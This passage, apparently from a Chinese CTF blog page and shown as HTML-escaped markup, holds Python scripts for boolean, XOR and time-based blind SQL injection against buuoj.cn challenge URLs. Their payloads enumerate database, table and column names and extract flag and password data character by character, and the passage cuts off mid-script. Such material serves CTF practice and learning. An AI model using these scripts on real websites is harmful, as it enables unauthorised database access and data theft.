punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;127&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; high &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; low&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39; or if (ascii (substr (database (),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;,sleep (2),1)#&#34;       #查库名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39;or if (ascii (substr ((seleCt (group_concat (table_name)) from (information_schema.tables) where (table_schema)=&#39;note&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;,sleep (2),1)#&#34;        #查表名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39;or if (ascii (substr ((seleCt (group_concat (column_name)) from (information_schema.columns) where (table_name)=&#39;users&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;,sleep (2),1)#&#34;        #查列名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;1&#39;or if(ascii(substr((seleCt(flag)from(fl4g)),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1))&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,sleep(2),1)#&#34;&lt;/span&gt;&lt;/span&gt;       &lt;span class=&#34;token comment&#34;&gt;#查数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;pass&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;qwer&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;        &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        last &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        now &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; now &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; last &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; low &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        flag &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;2通过get传参的脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2通过get传参的脚本&#34;&gt;#&lt;/a&gt; 2. 通过 get 传参的脚本&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;修改 url 和 文本&lt;/p&gt;
&lt;h2 id=&#34;21-基于异或盲注布尔盲注等&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-基于异或盲注布尔盲注等&#34;&gt;#&lt;/a&gt; 2.1 基于异或盲注，布尔盲注等：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;1^(ascii(substr(database(),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1))&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;)#&#34;&lt;/span&gt;&lt;/span&gt;       &lt;span class=&#34;token comment&#34;&gt;#查库名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34;1^(ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)=&#39;geek&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;)#&#34;        #查表名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34;1^(ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)=&#39;F1naI1y&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;)#&#34;      #查列名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34;1^(ascii (substr ((select (group_concat (password)) from (F1naI1y)),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;)#&#34;       #查数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;ERROR&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        name &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;22-基于时间盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-基于时间盲注&#34;&gt;#&lt;/a&gt; 2.2 基于时间盲注：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34; &#34;&lt;/span&gt;&lt;/span&gt;       &lt;span class=&#34;token comment&#34;&gt;#查库名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34; &#34;        #查表名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34; &#34;      #查列名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 